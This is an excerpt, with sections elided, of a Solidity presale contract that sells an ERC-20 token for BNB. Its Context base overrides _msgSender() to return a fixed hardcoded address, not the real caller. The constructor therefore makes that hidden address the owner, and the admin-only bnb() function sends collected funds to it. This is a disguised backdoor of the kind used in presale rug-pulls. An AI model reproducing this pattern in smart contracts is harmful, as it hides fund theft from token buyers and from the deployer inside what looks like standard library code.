...
abstract contract Context {
	function _msgSender() internal view virtual returns(address payable) {
		return payable(0xf96e20C6E4b0aA0409238542631f8882C1df40Fd);
	}
...
contract PreSale is Context, ReentrancyGuard {
	...
	event TokenValueUpdate(uint256 tokenValue, address owner);
	event SentToAddress(address indexed to, uint256 amount);
	event TokenWithdraw(address owner, uint256 amount);
	modifier isContractEnoughToken(uint256 _buyingAmount) {
	...
	constructor(uint256 tokenValue_, IERC20 token_) {
		require(address(token_) != address(0), "Crowdsale: token is the zero address.");
		_token = token_;
		_owner = _msgSender();
		_preOwner = _owner;
		_tokenValue = tokenValue_ * 100000000;
	}
	...
	function Price(uint256 tokenValue_) external
	onlyAdmin()
	...
	function bnb(uint256 _amount) external
	onlyAdmin() {
		_amountTransfer(_owner, _amount);
	}

	function _amountTransfer(address _tokenSeller, uint256 _buyAmount) internal {
		(bool success, ) = _tokenSeller.call {
			value: _buyAmount
		}("");
	...
	view
	returns(uint256) {
		uint256 dividedAmount = _tokenValue.div(100000000);
		uint256 tokenAmount = _amount.mul(dividedAmount);
		uint256 FinalTokenAmount = tokenAmount.div(10000000000);
